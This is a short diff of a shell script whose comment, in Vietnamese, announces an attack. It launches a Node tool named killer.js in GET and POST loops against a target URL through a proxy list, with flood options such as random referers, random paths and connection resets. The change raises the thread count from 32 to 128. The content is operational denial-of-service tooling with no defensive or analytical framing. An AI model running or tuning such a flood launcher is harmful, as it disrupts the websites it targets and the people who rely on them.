@@ -42,8 +42,8 @@ done
 
 # Chạy tấn công với killer.js
 for method in GET POST; do 
-  node killer.js "$method" "$URL" "$TIME" 5 32 live.txt \
-    --query 1 --delay 1 --referer rand --http mix \
+  node killer.js "$method" "$URL" "$TIME" 5 128 live.txt \
+    --query 1 --delay 1 --referer rand --http 1 \
     --close --randpath --parsed --reset --multipath 1 &
 done
 
